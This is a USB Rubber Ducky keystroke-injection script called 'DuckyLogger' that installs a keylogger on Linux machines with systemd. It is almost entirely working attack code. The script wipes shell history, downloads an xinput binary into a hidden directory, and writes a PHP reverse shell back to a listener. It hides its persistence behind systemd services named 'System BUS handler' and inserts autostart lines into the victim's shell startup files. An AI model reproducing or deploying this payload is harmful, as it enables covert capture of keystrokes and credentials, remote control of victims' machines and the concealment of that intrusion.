REM_BLOCK
Title:       DuckyLogger
Description: Key logger which sends each and every key stroke of target remotely/locally.
AUTHOR:      drapl0n
Version:     1.0
Category:    Credentials
Target:      Unix-like operating systems with systemd
Attackmodes: HID

Visit https://github.com/drapl0n/DuckyLogger/README.md for usage and other important instructions.
END_REM

DUCKY_LANG US

REM [keeping tracks clear]
DELAY 5000
CTRL ALT t
DELAY 400
STRINGLN unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
DELAY 100

REM [creating key logging mechanism]
STRINGLN mkdir /var/tmp/.system
DELAY 100
STRINGLN echo "/var/tmp/.system/./xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 /var/tmp/.system/./xinput test" > /var/tmp/.system/sys 
DELAY 100
STRINGLN chmod +x /var/tmp/.system/sys
DELAY 100

REM [importing xinput]
STRINGLN cd /var/tmp/.system/
DELAY 100
STRINGLN wget --no-check-certificate --content-disposition https://github.com/drapl0n/DuckyLogger/blob/main/xinput\?raw=true
DELAY 5000
STRINGLN chmod +x xinput
DELAY 100

REM [creating reverse shell]
STRINGLN echo -e "while :\ndo\n\tping -c 5 0.0.0.0\n\tif [ $? -eq 0 ]; then\n\t\tphp -r '\$sock=fsockopen(\"0.0.0.0\",4444);exec("\"/var/tmp/.system/sys -i "<&3 >&3 2>&3"\"");'\n\tfi\ndone" >  /var/tmp/.system/systemBus
DELAY 100
STRINGLN chmod +x /var/tmp/.system/systemBus
DELAY 100

REM [creating systemd service to execute payload on boot]
STRINGLN mkdir -p ~/.config/systemd/user
DELAY 200
STRINGLN echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/systemBUS.service
DELAY 100

REM [creating reboot script incase if listner stops or targets internet connection gets lost] 
STRINGLN echo "while true; do systemctl --user restart systemBUS.service; sleep 15m; done" > /var/tmp/.system/reboot
DELAY 100
STRINGLN chmod +x /var/tmp/.system/reboot
DELAY 100

REM [creating systemd service to execute payload on boot]
STRINGLN echo -e "[Unit]\nDescription= System BUS handler reboot.\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/reboot -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/reboot.service
DELAY 100

REM [enabling service]
STRINGLN systemctl --user daemon-reload
DELAY 300
STRINGLN systemctl --user enable --now systemBUS.service
DELAY 150
STRINGLN systemctl --user start --now systemBUS.service
DELAY 150
STRINGLN systemctl --user enable --now reboot.service
DELAY 150
STRINGLN systemctl --user start --now reboot.service
DELAY 100

REM [autostarting service on terminal/shell launch]
STRINGLN echo -e "ls -a | grep 'zshrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"systemctl --user enable --now reboot.service && systemctl --user enable --now systemBUS.service\" >> ~/.zshrc\nfi\n\nls -a | grep 'bashrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"systemctl --user enable --now reboot.service && systemctl --user enable --now systemBUS.service\" >> ~/.bashrc\nfi" > ~/tmmmp
DELAY 100
STRINGLN chmod +x ~/tmmmp && cd ~/ && ./tmmmp && rm tmmmp && exit